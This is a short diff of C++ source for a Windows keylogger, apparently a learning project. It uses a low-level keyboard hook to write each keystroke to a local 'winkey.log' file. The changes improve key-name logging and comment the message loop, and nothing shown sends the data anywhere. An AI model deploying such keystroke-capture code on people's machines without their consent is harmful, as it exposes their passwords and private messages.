@@ -96,7 +96,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
          *  the virtual key code.
          */
         if (result > 0) logFile << buffer;
-        else logFile << L"[VK_" << p->vkCode << L"]";
+        else logFile << GetKeyName(p->vkCode);
 
         // Ensure that everything written to the file is immediately pushed to disk
         logFile.flush();
@@ -119,6 +119,7 @@ int main(void) {
     logFile.open("winkey.log", std::ios::app);
     if (!logFile.is_open()) {
         std::cerr << "Failed to open log file." << std::endl;
+        //TODO clean quit
         return 1;
     }
 
@@ -129,15 +130,18 @@ int main(void) {
         return 1;
     }
 
-    // Standard message loop
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
+    /*
+     * Message loop
+     *
+     * - MSG: structure holding message information from the message queue.
+     *  It includes data like message type (e.g., WM_KEYDOWN), window handle,
+     *  wParam, lParam, etc.
+     * 
+     * - GetMessage: blocks until a Windows message (like an event) is available.
+     */
 
-        // Check every 500ms
-        std::this_thread::sleep_for(std::chrono::milliseconds(500));
-    }
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {}
 
     // Cleanup
     UnhookWindowsHookEx(keyboardHook);
